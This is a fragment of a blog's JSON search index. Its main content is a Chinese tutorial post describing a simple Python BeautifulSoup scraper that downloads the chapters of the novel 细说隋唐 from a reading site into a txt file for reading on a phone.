后记\n本来一片雄心想大写特写，然而，理想很丰满，现实很骨感，还是没写多少东西，不过感觉也差不多够用了(#^.^#)。\n\n\n\n\n\n","tags":["tkinter"],"categories":["资料"]},{"title":"Spider攻城记","url":"/2017/12/15/spider1/","content":"刚刚起步，先来点东西水一水...\n<!--more-->\n\n### 为什么要干这个呢\n\n　　最近突然想看《细说隋唐》，但是网上找资源很难找，好不容易找到一个在线阅读网站但是这个网站的页面不能自动适应手机界面，很烦，而且不能自动切换到下一章，每一次都得返回目录页找下一章，而且页面上还有广告QAQ~~…总之不舒服，于是突发奇想做个爬虫（spider）把内容爬下来，然后导入手机观看，这样岂不是很有逼格？！说干就干。\n　　目标网址[Link](http://www.saohua.com/shuku/xishuosuitang)\n\n### 工具\n\n　　python、掌阅（一款电子书APP）、python包BeautifulSoup4\n\n### 分析URL\n\n　　每个具体章节例如第5章{%raw%}http://www.saohua.com/shuku/xishuosuitang/ldf06.htm{%endraw%}，发现第i章URL为{%raw%}http://www.saohua.com/shuku/xishuosuitang/ldf{%endraw%}<font color=#00ffff size=3>**i-5**</font>.htm\n\n### 开始攻城\n\n　　既然规律找到了那么接下来就好办了，这里还有一个问题，掌阅可以自动生成目录，其实是把你的txt文件中的第几回第几章等自动生成，所以文件里要有第几章所以加了一段转换代码生成\"第几章\"字样，贴一下代码。\n```bash\nimport urllib.request as u\nfrom bs4 import BeautifulSoup \n\nf=open('a.txt','w+')\n\nfor i in range(22,111):\n\turl=\"http://www.saohua.com/shuku/xishuosuitang/ldf\"+str(i)+\".htm\"\n\tres=u.urlopen(url)\n\thtml=res.read().decode('gbk')\n\n\tsoup = BeautifulSoup(html,'lxml')\n\tfor col in range(2):\n\t\tfor data in soup.find_all('font')[col]:\n\t\t\tif(data.string!='HTMLBUILERPART0' and data.string!='/HTMLBUILERPART0'):\n\t\t\t\tif(data.string==None):\n\t\t\t\t\tf.write('\\n')\n\t\t\t\telif(str(i-5) in data.string):\n\t\t\t\t\tf.write('第'+str(i-5)+'回:'+data.string)\n\t\t\t\telse:\t \n\t\t\t\t\tf.write(data.string)\n\nf.close()\n```\n\n运行一下，大概三四秒钟...\n\n```bash\nC:\\Users\\xxx\\Desktop>python spider.py\n``` \n\n### 导入手机\n\n这部分大家应该都会吧，打开掌阅导入一下就可以看了。\n\n### 填坑总结\n\n1.好好学英语吧，BeautifulSoup官方文档是靠着Google浏览器自动翻译的，研究了半天。\n2.还有需要注意文字编码问题。\n3.由于这个网站没有屏蔽爬虫，所以简单代码就可以。\n4.{%raw%}{%raw%}{%endraw%}{%endraw%}可以使输入的文本不被解析。","tags":["Spider","Python"],"categories":["教程"]}]